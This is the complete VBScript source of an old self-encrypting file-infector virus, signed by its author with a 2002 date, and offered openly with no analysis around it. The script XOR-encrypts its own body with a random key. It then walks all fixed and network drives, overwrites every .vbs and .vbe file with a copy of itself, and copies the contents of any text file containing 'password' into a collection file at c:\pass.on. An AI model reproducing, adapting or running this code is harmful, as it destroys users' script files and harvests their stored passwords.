on error resume next
randomize 
key = int((rnd() * 10) + 16)
Set fso = CreateObject("Scripting.FileSystemObject")
set a = fso.OpenTextFile(Wscript.ScriptFullname, 1)
aa = a.readline
ddd = a.readline
b = a.readall
For o = 1 to Len(b)
X = X & Hex(Asc(Mid(b, o, 1)) xor key)
Next
For y = 2 to Len(aa) Step 2
zz = zz & Chr(("&h" + Mid(aa, y, 2)) xor key1)
next
set a = fso.CreateTextFile(Wscript.ScriptFullname, true)
a.Writeline "'" & X
a.Writeline "key1 = " & key
a.write zz
a.Close
fso.deletefile("c:\pass.on")
set ag = fso.CreateTextFile("c:\pass.on", true)
ag.writeline "..."
ag.close
huhu()
Sub huhu()
On Error Resume Next
dim f,f1,fc
Set fso = CreateObject("Scripting.FileSystemObject")
Set dr = fso.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
szt(d.path&"\")
End If
Next
End Sub
Sub szt(er)
On Error Resume Next
Set sf=CreateObject("Scripting.FileSystemObject")
Set f = sf.GetFolder(er)
Set sf = f.SubFolders
For Each f1 in sf
yyyy(f1.path)
szt(f1.path)
Next
End Sub
Sub yyyy(uu)
On Error Resume Next
Set sf=CreateObject("Scripting.FileSystemObject")
Set f = sf.GetFolder(uu)
Set fc = f.Files
For Each f1 in fc
ext = sf.GetExtensionName(f1.path)
ext = lcase(ext)
if (ext="vbs") or (ext="vbe") Then
set ddd = sf.getfile(wscript.scriptfullname)
ddd.copy(f1.path)
end if
if (ext="txt") then
Set cot=sf.OpenTextFile(f1.path, 1, False)
hhh = cot.readall
If InStr(1, hhh, "password") Then
set age = sf.opentextfile("c:\pass.on", 8)
age.writeline hhh
age.close
end if
end if
next
end sub
'vbs.janis by alcopaul/[rRlf]
'may 02, 2002
'a friend with weed is a friend indeed..